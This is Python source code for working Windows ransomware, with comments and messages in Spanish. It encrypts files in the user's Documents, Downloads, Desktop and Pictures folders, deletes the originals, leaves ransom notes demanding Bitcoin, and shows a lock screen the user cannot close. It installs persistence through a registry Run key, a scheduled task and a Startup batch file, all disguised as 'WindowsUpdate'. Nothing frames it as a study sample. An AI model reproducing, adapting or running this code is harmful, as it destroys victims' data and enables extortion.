import os
import sys
import random
import string
import time
import subprocess
import ctypes
import threading
import winreg
import getpass
from pathlib import Path
import tkinter as tk
from tkinter import messagebox

class RansomwarePersistente:
    def __init__(self):
        self.directories_to_encrypt = [
            '~/Documents',
            '~/Downloads', 
            '~/Desktop',
            '~/Pictures'
        ]
        self.excluded_dirs = [
            'Windows', 'Program Files', 'Program Files (x86)',
            'System32', 'Windows.old', 'Recovery', '$Recycle.Bin'
        ]
        self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
        self.price = 500
        self.encryption_count = 0
        self.password = None
        self.victim_id = None
        self.script_path = os.path.abspath(__file__)
        self.window_open = False
        
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def show_banner(self):
        """Muestra el banner ASCII"""
        banner = """
 ██████╗ ██████╗ ███████╗██████╗ ████████╗██╗███╗   ██╗ ██████╗ 
██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║████╗  ██║██╔════╝ 
██║   ██║██████╔╝█████╗  ██████╔╝   ██║   ██║██╔██╗ ██║██║  ███╗
██║   ██║██╔══██╗██╔══╝  ██╔══██╗   ██║   ██║██║╚██╗██║██║   ██║
╚██████╔╝██║  ██║███████╗██║  ██║   ██║   ██║██║ ╚████║╚██████╔╝
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
==================================================
        TU INFORMACION HA SIDO SECUESTRADA
==================================================
"""
        print(banner)

    def install_persistence(self):
        """Instala multiples metodos de persistencia"""
        print("[*] Instalando persistencia...")
        try:
            # Metodo 1: Registro de Windows - Run
            self._install_registry_persistence()
            # Metodo 2: Tareas Programadas
            self._install_scheduled_task()
            # Metodo 3: Carpeta Startup
            self._install_startup_folder()
            
            print("[+] Persistencia instalada correctamente")
            return True
        except Exception as e:
            print("[-] Error instalando persistencia:", e)
            return False

    def _install_registry_persistence(self):
        """Instala persistencia en el registro de Windows"""
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{self.script_path}"')
            print(" [+] Persistencia en registro instalada")
        except Exception as e:
            print(" [-] Error en registro:", e)

    def _install_scheduled_task(self):
        """Crea una tarea programada"""
        try:
            task_name = "WindowsUpdateTask"
            cmd = [
                'schtasks', '/create', '/tn', task_name, 
                '/tr', f'"{sys.executable}" "{self.script_path}"',
                '/sc', 'onlogon', '/f'
            ]
            result = subprocess.run(cmd, capture_output=True, shell=True)
            if result.returncode == 0:
                print(" [+] Tarea programada instalada")
            else:
                print(" [-] Error instalando tarea programada")
        except Exception as e:
            print(" [-] Error en tarea programada:", e)

    def _install_startup_folder(self):
        """Copia el script a la carpeta de inicio"""
        try:
            startup_folder = os.path.join(
                os.path.expanduser('~'),
                'AppData', 'Roaming', 'Microsoft', 'Windows',
                'Start Menu', 'Programs', 'Startup'
            )
            if not os.path.exists(startup_folder):
                os.makedirs(startup_folder, exist_ok=True)
            
            bat_content = f'@echo off\n"{sys.executable}" "{self.script_path}"\n'
            bat_path = os.path.join(startup_folder, 'WindowsUpdate.bat')
            with open(bat_path, 'w') as f:
                f.write(bat_content)
            print(" [+] Persistencia en carpeta Startup instalada")
        except Exception as e:
            print(" [-] Error en carpeta Startup:", e)

    def check_persistence(self):
        """Verifica si ya hay persistencia instalada"""
        try:
            # Verificar registro
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as reg_key:
                try:
                    value, _ = winreg.QueryValueEx(reg_key, "WindowsUpdate")
                    if os.path.abspath(__file__) in value:
                        return True
                except FileNotFoundError:
                    pass
            return False
        except:
            return False

    def expand_paths(self):
        expanded_dirs = []
        for directory in self.directories_to_encrypt:
            expanded_path = os.path.expanduser(directory)
            if os.path.exists(expanded_path):
                expanded_dirs.append(expanded_path)
        return expanded_dirs if expanded_dirs else ['.']

    def should_encrypt(self, filepath):
        file_str = str(filepath).lower()
        for excluded in self.excluded_dirs:
            if excluded.lower() in file_str:
                return False
        try:
            if filepath.stat().st_size < 100 or filepath.stat().st_size > 100 * 1024 * 1024:  # 100MB max
                return False
        except:
            return False
        valid_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.jpeg', '.png', '.zip', '.rar', '.mp3', '.mp4', '.avi']
        return any(file_str.endswith(ext) for ext in valid_extensions)

    def generate_keys(self):
        s = string.ascii_lowercase + string.digits + string.ascii_uppercase
        self.password = ''.join(random.sample(s, 20))
        self.victim_id = ''.join(random.sample(string.ascii_lowercase + string.digits, 8))
        print(f"[+] CLAVE GENERADA: {self.password}")
        print(f"[+] ID VÍCTIMA: {self.victim_id}")

    def simple_encrypt(self, data, key):
        """Cifrado simple XOR con la clave"""
        encrypted = bytearray()
        key_bytes = key.encode()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
        return bytes(encrypted)

    def encrypt_file(self, filepath):
        try:
            if not self.should_encrypt(filepath):
                return False
            
            # Leer el archivo original
            with open(filepath, 'rb') as f:
                original_data = f.read()
            
            # Cifrar los datos
            encrypted_data = self.simple_encrypt(original_data, self.password)
            
            # Escribir el archivo cifrado
            encrypted_file = str(filepath) + '.ENCRYPTED'
            with open(encrypted_file, 'wb') as f:
                f.write(encrypted_data)
            
            # Eliminar el archivo original
            os.remove(filepath)
            
            self.encryption_count += 1
            return True
            
        except Exception as e:
            print(f"Error cifrando {filepath}: {e}")
            return False

    def encrypt_directory(self, directory):
        encrypted_files = 0
        try:
            for root, dirs, files in os.walk(directory):
                # Excluir directorios del sistema
                dirs[:] = [d for d in dirs if not any(excl.lower() in os.path.join(root, d).lower() for excl in self.excluded_dirs)]
                for file in files:
                    filepath = Path(root) / file
                    if self.encrypt_file(filepath):
                        encrypted_files += 1
                        if encrypted_files % 10 == 0:  # Mostrar progreso cada 10 archivos
                            print(f" [+] Cifrados: {encrypted_files} archivos...")
            return encrypted_files
        except Exception as e:
            print(f"Error cifrando directorio {directory}: {e}")
            return 0

    def create_ransom_note(self):
        note = f"""
================================================================
!!! SISTEMA BLOQUEADO !!!
================================================================
TU INFORMACION HA SIDO SECUESTRADA

INFORMACION PARA LA RECUPERACION:
* ID Unico: {self.victim_id}
* Pago Requerido: ${self.price} en Bitcoin
* Direccion Bitcoin: {self.bitcoin}

ADVERTENCIAS:
* NO REINICIE EL SISTEMA
* NO REINSTALE EL SISTEMA
* NO INTENTE DESCIFRAR LOS ARCHIVOS MANUALMENTE

Para recuperar sus archivos, ingrese la clave de descifrado:
"""
        locations = [
            os.path.expanduser('~/Desktop/LEAME_URGENTE.txt'),
            os.path.expanduser('~/Documents/INSTRUCCIONES.txt'),
            os.path.expanduser('~/Downloads/INSTRUCCIONES.txt')
        ]
        for location in locations:
            try:
                with open(location, 'w', encoding='utf-8') as f:
                    f.write(note)
                print("[+] Nota de rescate creada en: " + location)
            except:
                pass

        # Guardar credenciales localmente por si acaso
        try:
            with open('CREDENCIALES_LOCALES.txt', 'w') as f:
                f.write(f"ID: {self.victim_id}\n")
                f.write(f"PASSWORD: {self.password}\n")
                f.write(f"BITCOIN: {self.bitcoin}\n")
                f.write(f"PRICE: ${self.price}\n")
            print("[+] Credenciales guardadas en CREDENCIALES_LOCALES.txt")
        except:
            pass

    def show_ransomware_window(self):
        """Muestra la ventana de ransomware con fondo negro"""
        if self.window_open:
            return
            
        try:
            self.window_open = True
            root = tk.Tk()
            root.title("!!! WARNING !!!")
            root.attributes("-topmost", True)
            root.configure(bg="black")
            root.attributes("-fullscreen", True)
            
            # Prevenir cierre
            root.protocol("WM_DELETE_WINDOW", lambda: None)
            root.bind("<Escape>", lambda e: "break")
            root.bind("<Alt-F4>", lambda e: "break")
            
            # Frame principal
            main_frame = tk.Frame(root, bg="black")
            main_frame.pack(fill="both", expand=True, padx=50, pady=50)
            
            # Título
            title_label = tk.Label(
                main_frame,
                text="¡TU SISTEMA HA SIDO SECUESTRADO!",
                font=("Arial", 24, "bold"),
                fg="red",
                bg="black"
            )
            title_label.pack(pady=20)
            
            # Mensaje
            message_label = tk.Label(
                main_frame,
                text="Todos tus archivos han sido cifrados.\nPara recuperarlos debes pagar el rescate.",
                font=("Arial", 16),
                fg="white",
                bg="black"
            )
            message_label.pack(pady=10)
            
            # Información
            info_text = f"""
ID VÍCTIMA: {self.victim_id}
RESCATE: ${self.price} USD
BITCOIN: {self.bitcoin}

Ingrese la clave de descifrado si ya ha pagado:
"""
            info_label = tk.Label(
                main_frame,
                text=info_text,
                font=("Arial", 12),
                fg="yellow",
                bg="black",
                justify="left"
            )
            info_label.pack(pady=20)
            
            # Entrada de clave
            self.password_var = tk.StringVar()
            password_entry = tk.Entry(
                main_frame,
                textvariable=self.password_var,
                font=("Arial", 14),
                width=40,
                show="*",
                bg="white",
                fg="black"
            )
            password_entry.pack(pady=10)
            password_entry.focus()
            
            # Botón de verificación
            verify_btn = tk.Button(
                main_frame,
                text="VERIFICAR CLAVE",
                font=("Arial", 12, "bold"),
                bg="red",
                fg="white",
                command=lambda: self.verify_decryption_key(root),
                width=20,
                height=2
            )
            verify_btn.pack(pady=20)
            
            # Advertencia
            warning_label = tk.Label(
                main_frame,
                text="ADVERTENCIA: No cierre esta ventana. El sistema se reiniciará automáticamente.",
                font=("Arial", 10),
                fg="orange",
                bg="black"
            )
            warning_label.pack(pady=10)
            
            # Vincular Enter
            password_entry.bind('<Return>', lambda e: self.verify_decryption_key(root))
            
            root.mainloop()
            
        except Exception as e:
            print(f"Error mostrando ventana: {e}")
            self.window_open = False

    def verify_decryption_key(self, root):
        """Verifica si la clave de descifrado es correcta"""
        entered_password = self.password_var.get()
        if entered_password == self.password:
            messagebox.showinfo("ÉXITO", "Clave correcta! Iniciando descifrado...")
            root.destroy()
            self.window_open = False
            self.start_decryption()
        else:
            messagebox.showerror("ERROR", "Clave incorrecta. Sistema bloqueado.")
            self.password_var.set("")

    def simple_decrypt(self, data, key):
        """Descifrado simple XOR (es reversible)"""
        return self.simple_encrypt(data, key)  # XOR es reversible

    def start_decryption(self):
        """Inicia el proceso de descifrado"""
        try:
            decrypt_script = f'''
import os
import winreg
import subprocess

VICTIM_ID = "{self.victim_id}"
PASSWORD = "{self.password}"

def simple_decrypt(data, key):
    """Descifrado simple XOR con la clave"""
    decrypted = bytearray()
    key_bytes = key.encode()
    for i, byte in enumerate(data):
        decrypted.append(byte ^ key_bytes[i % len(key_bytes)])
    return bytes(decrypted)

def main():
    print("Iniciando descifrado de archivos...")
    print(f"ID Víctima: {{VICTIM_ID}}")
    
    # Descifrar archivos
    encrypted_files = []
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if file.endswith('.ENCRYPTED'):
                encrypted_files.append(os.path.join(root, file))
    
    success_count = 0
    for enc_file in encrypted_files:
        try:
            # Leer archivo cifrado
            with open(enc_file, 'rb') as f:
                encrypted_data = f.read()
            
            # Descifrar datos
            decrypted_data = simple_decrypt(encrypted_data, PASSWORD)
            
            # Escribir archivo descifrado
            original_file = enc_file[:-10]  # Remover .ENCRYPTED
            with open(original_file, 'wb') as f:
                f.write(decrypted_data)
            
            # Eliminar archivo cifrado
            os.remove(enc_file)
            
            success_count += 1
            print(f"[+] Recuperado: {{os.path.basename(original_file)}}")
            
        except Exception as e:
            print(f"[-] Error con {{os.path.basename(enc_file)}}: {{e}}")
    
    # Remover persistencia
    print("\\\\n[*] Removiendo persistencia...")
    try:
        # Registro
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            try:
                winreg.DeleteValue(reg_key, "WindowsUpdate")
                print("[+] Persistencia del registro removida")
            except:
                pass
        
        # Tarea programada
        os.system('schtasks /delete /tn "WindowsUpdateTask" /f 2>nul')
        print("[+] Tarea programada removida")
        
        # Startup
        startup_folder = os.path.join(
            os.path.expanduser("~"),
            'AppData', 'Roaming', 'Microsoft', 'Windows',
            'Start Menu', 'Programs', 'Startup'
        )
        bat_path = os.path.join(startup_folder, 'WindowsUpdate.bat')
        if os.path.exists(bat_path):
            os.remove(bat_path)
            print("[+] Archivo de startup removido")
        
        # Archivos temporales
        files_to_remove = ["LEAME_URGENTE.txt", "INSTRUCCIONES.txt", "CREDENCIALES_LOCALES.txt"]
        for file in files_to_remove:
            if os.path.exists(file):
                os.remove(file)
                print(f"[+] Archivo {{file}} removido")
                
    except Exception as e:
        print(f"[-] Error removiendo persistencia: {{e}}")
    
    print(f"\\\\n[+] PROCESO COMPLETADO!")
    print(f"[*] Archivos recuperados: {{success_count}}/{{len(encrypted_files)}}")
    print("\\\\n[+] Sistema completamente recuperado!")
    input("Presione Enter para salir...")

if __name__ == "__main__":
    main()
'''
            with open('DECRYPT_FILES.py', 'w') as f:
                f.write(decrypt_script)
                
            print("[+] Ejecutando descifrado...")
            subprocess.Popen([sys.executable, 'DECRYPT_FILES.py'])
            
        except Exception as e:
            print(f"Error iniciando descifrado: {e}")

    def execute_ransomware(self):
        """Ejecuta el ransomware completo"""
        self.show_banner()
        print("[*] INICIANDO RANSOMWARE")
        print("=" * 40)
        
        # Verificar persistencia
        if not self.check_persistence():
            print("[*] Instalando persistencia...")
            self.install_persistence()
        else:
            print("[*] Persistencia ya instalada")

        # Generar claves
        print("[*] Generando claves...")
        self.generate_keys()

        # Cifrar archivos
        print("[*] Cifrando archivos...")
        directories = self.expand_paths()
        total_encrypted = 0
        for directory in directories:
            print(f"[*] Cifrando: {directory}")
            encrypted = self.encrypt_directory(directory)
            total_encrypted += encrypted
            print(f" [+] {directory}: {encrypted} archivos cifrados")

        # Crear nota de rescate
        print("[*] Creando nota de rescate...")
        self.create_ransom_note()

        print(f"[+] COMPLETADO: {total_encrypted} archivos cifrados")
        print(f"[+] CLAVE: {self.password}")
        print(f"[+] ID: {self.victim_id}")
        
        # Mostrar ventana
        print("[*] Mostrando ventana de ransomware...")
        self.show_ransomware_window()

if __name__ == "__main__":
    try:
        ransomware = RansomwarePersistente()
        ransomware.execute_ransomware()
    except Exception as e:
        print(f"Error: {e}")
        input("Presione Enter para salir...")
